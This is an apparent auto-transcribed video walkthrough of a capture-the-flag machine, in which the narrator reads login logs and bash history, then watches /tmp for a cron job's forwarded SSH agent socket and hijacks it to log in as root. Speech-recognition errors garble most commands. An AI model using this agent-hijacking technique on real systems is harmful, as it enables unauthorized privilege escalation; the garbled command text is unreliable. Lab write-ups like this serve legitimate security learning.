ubuntu cat ID or i say hopefully this is going to be on like port 2 2 2 2 because enumeration kept telling us we kept finding docker containers so let's do VDI drsa chmod 600 i and we're going to what 10 10 10 101 port 2 2 2 2 and permission denied public key we can try kaneki at this kaneki underscore ADM and that was weird ok so if the user doesn't exist it just closes us that's fine I'm just gonna try a Carnegie pub real quick make sure I didn't miss a numerate but forget something and in the past race with this key is going to be I love to go paste okay so I'm guessing the challenges we have to get to this box so let's go see what we have here authorized keys kaneki history is gonna be blank of course su - LS away I'm home we got a history file come on let's see it's SS aging Toru su - kaneki ADM ssh fruit at 172 1801 - P - 2 - 2 - V yeah you can't log in and that can't all get either so let's see let's check out who's currently logged in just us of our log do we have like an access log last log and scrap - I root sure this pie can get a lot of hits w10 matches let's try kaneki and oh that's good our terminal type reset and then Hannah to fix that that was W temp if we do last we can see a bunch of logins so now I'm beginning to remember the path so if we go to Etsy ssh v ssh underscore config we do have the ford agent feature and this is kind of like a ssh single sign-on type thing and it works mainly by being in slash temp let's do LS la let's go back to root so if I do exit I should be root because I did su to kaneki admin and what's going temp understood this because this is going to ensure that we are the root user so we do last we can see about every maybe five minutes we see a login so if we do LS watch - and one for one second LS grab - V and we're going to grab that a few things I want to put this and double quotes so this can be in single quotes and we'll say we don't want this we don't want this and we don't want this we don't want any of our active things okay and then we also specify a double quote hit enter and then we just wait for something new to pop up and runs around every five minutes and I think the last one was at like probably 11 or 12 so we'll just wait I'll speed the video up and resume it as soon as we see something pop up something popped up as I was talking sweet so copy this go into this directory do an LS it's 1440 s SH off Saw equals agent 1440 ssh route at 172 1801 - P - 2 - 2 and there we go we have rode his session in so what I was hoping to do while we wait with a ssh agent man page or something let's see there's got to be a good ssh agent thing I'm not too familiar with ssh agents that's the CH agent how to configure this is a good first to kind of explain it but we're now rude on this WC - C root dart text there we go 30 30 characters which is 32 plus a line break so let's see how this works we can't log Sh I was like it's just going to sleep for 50 seconds so let's go to cron job - L no contact route vers pool front and then cron tabs see if anyone has a specialized Kanta kaneki does so let's see what conky's is okay every six minutes he's going to execute login SH so go into kaneki cat login Sh let's do this so SH agent looks like he's going to create one that is agency F and then he's going to source it so he sets this variable and then exports his thing and then he's adding let's see that's H ad identity added and then a state ad - L was probably going to list okay I'm an SSH tt-there's going to create a sudo terminal so it works in scripts - capital a this is going to be for forwarding SSH agents and here is the SSH so he's logging into once I'm to 2001 50 and then using that to log into 172 1801 so I think we actually saw this way back and oh no nevermind this is 18 not 20 and you know what I said but logging in and executing log dot Sh wait so he's into 2001 50 2001 50 is okay I understand what's happening now I thought he was going to do like a sh login to the web server and then forward it to this guy but what's happening this is logging in 172 2001 50 this is actually the box we were on so if we do this yes there's a kaneki PC and then from kaneki PC he is SSA Qing back into himself so he's creating a circular loop goes 172 1801 is himself he could also change this to 172 2001 so yeah it's kind of weird how that cron is set up it's goes from host box to we'll call this the jump box and it fours the SSH to this jump box and goes down here and then back over to the host box so hopefully that makes sense there's what the cron is doing so it creates the SSH agent and we intercepted here and then when it does that we also create a chain back to the host box so hopefully that made sense it's a little complicated or hard to explain I think but that is the box hope you guys enjoyed it take care and I will see you all next week